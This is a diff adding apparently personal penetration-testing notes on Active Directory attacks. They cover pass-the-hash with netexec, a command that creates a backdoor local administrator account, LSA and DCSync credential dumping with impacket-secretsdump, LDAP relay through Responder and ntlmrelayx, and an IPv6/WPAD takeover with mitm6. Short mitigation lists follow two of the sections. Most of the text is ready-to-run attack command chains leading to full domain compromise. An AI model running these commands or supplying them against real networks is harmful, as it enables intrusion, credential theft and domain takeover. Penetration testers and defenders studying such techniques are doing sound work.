@@ -1,0 +1,99 @@
+#Pass The Hash Attack 
+netexec smb IP -u Administrator -H HASH --localauth 
+netexec smb IP -u Administrator -H HASH --localauth --lsa 
+
+	--lsa:
+	passwords that are stored in the windows history in a clear text. 
+
+	similarly we can pass the hash in the network using Subnet. 
+
+netexec smb SUBNETIP -u Administrator -H HASH --localauth
+
+we can also add the particular user in the domain using the commands 
+
+netexec smb IP -u Administrator -H Hashes -x 'net user pentest Pentest@123 && net localgroup Administrators pentest /add' 
+
+	to check if the system has the EDR; use the tool smbclient(impacket-smbclient) as localadministrator; rdp into the system	(ProgramFiles/system32)(use the tool magnet capture 	to dump ram and user the tool votality(forensics tool to ananlys the ram dump))
+	 
+
+
+What if the SMB signing is enabled in the network-- use this traffic to relay it to the LDAP protocol (SMB -> HTTP -> LDAP/LDAPS)
+Cross Protocol Relay 
+
+
+
+#LLMNR is a protocol, NTLM is a hash
+
+
+#LDAP Relay attack -- (unauthorized access to domain gets the control of Domain controller)
+Responder - we look for the HTTP responses, switch to the LDAP attack run the impacket, target the ldap services running on the ldap services and perform the services which are present in the domain. 
+
+responder -I eth0 
+disable the SMB,HTTP server from the config file 
+
+impacket-ntlmrelayx -t ldap://DCIP --add-computer 
+	#simulate the scenario now, access anything from the browse from the any user;browser anything which is not valid 
+
+	responder will poision it, it will authenticate it and target the domain controller and will create a user and gives a clear text credentials (you can identify the domain user by "$") it will also create all domain informs dump so you can access the HTML File.
+
+	Let's suppose we can a domain admin's user ldap response, we can create the user same as domain admin 
+	using this user we can use the blound hound and do the dcsycn privilegdes 
+
+	okay now we have created/add a user escalate the user 
+
+impacket-ntlmrelayx -t ldap://DCIP --escalate-user USER$
+
+#DCSync Attack
+impacket-secretsdump domainname/'username':'password'@DCIP 
+
+once you get the hash of the domain controller you verify by 
+
+netexec smb DCIP -u Administrator -H HASH (Pwn3d!).
+
+#Mitigations
+Enable LDAP Signing and Channel Binding on DCs
+
+
+#IPv6 DNS Takeover attack 
+
+whenever the windows system starts it aoutmatically search for the wpad server for proxy server IP in the network which it can have access to the internet, if no wpad server present in the network it automatically interpret that there is no proxy server and directly connect to the internet. Since the system is in the network machine are behind the proxy server. 
+
+Main attack is we spoof the DNS and give a fakewpad server address and IPs to the machine; so whenever the machine access anything over internet it will ask for authentication and onces the credentials are entered.  We will get those systems Net-NTLM hashes or the Sam hashes. Pass the hash or do the same process as LDAP relay attack and add the user using this credentials and Escalate it to domain admin. 
+
+Run the tool mitm6 
+python mitm6.py -d domainname 
+
+impacket-ntlmrelayx -t ldap://DCIP --add-computer -wh fakewap.domain.name
+we will get the user created with the credentials in plain text 
+
+impacket-ntlmrelayx -t ldap://DCIP --escalate-user USER$ -wh fakewap.domain.name 
+once the user is excalated to domain admin dump the secrets
+
+impacket-secretsdump domain/'USER$':'PASSWORD'@DCIP 
+dump every users hashes in the domain and get the access using netexec(like we did it in the PASS the HASh)
+
+
+netexec smb DCIP -u Administrator -H HASH (Pwn3d!).
+
+
+
+
+##Main difference between the ldap relay attack and Iv6 attack
+
+Ldap relay attack - we wait for the users for wrong access over the internet 
+IPv6 - we purposely make them authenticate over the internet 
+also we exploit the misconfiguration present in the IPv6 
+IPv6 is by default enabled. 
+
+#Mitigations
+
+Enable the LDAP signing, 
+Disable the IPv6 if not in used 
+Disable the wpad service if the proxy server not in placed. 
+
+
+
+ 
+
+ 
+ 
